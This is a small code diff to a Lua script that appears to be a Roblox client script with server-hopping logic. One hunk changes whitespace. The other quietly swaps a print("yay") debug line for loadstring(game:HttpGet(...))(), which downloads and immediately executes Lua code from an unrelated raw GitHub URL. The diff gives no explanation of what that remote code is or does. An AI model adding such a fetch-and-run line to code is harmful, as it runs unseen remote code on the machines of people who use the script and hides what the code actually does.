@@ -10,7 +10,7 @@ local function changeserver()
     })
 
 	wait(5)
-	
+
     local md5 = {}
 local hmac = {}
 local base64 = {}
@@ -281,7 +281,7 @@ local function checkPlayers()
     if count > 1 then
         pcall(changeserver)
     else
-        print("yay")
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/asdfghjkasdfghasdfg/t/refs/heads/main/pvsb.lua"))()
     end
 end
 
